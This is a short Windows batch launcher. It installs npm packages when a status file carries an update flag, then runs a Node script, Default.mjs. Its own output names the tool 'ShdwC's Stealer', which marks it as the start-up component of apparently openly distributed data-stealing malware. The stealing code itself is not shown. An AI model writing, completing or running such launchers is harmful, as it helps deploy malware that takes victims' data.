@echo off

set scriptpath=%~dp0
set supplementarypath=%scriptpath%\supplementary_commands


if exist "%supplementarypath%\STATUS.txt" (
    findstr /C:"RUN_NPM_UPDATE" "%supplementarypath%\STATUS.txt" >nul
    if not errorlevel 1 (
        echo "ShdwC's Stealer - Updating required NPM packages" 
        cd /d "%supplementarypath%" && call npm i
    )
)

msg * This is a free application, if you paid for it you got scammed 
node Default.mjs

PAUSE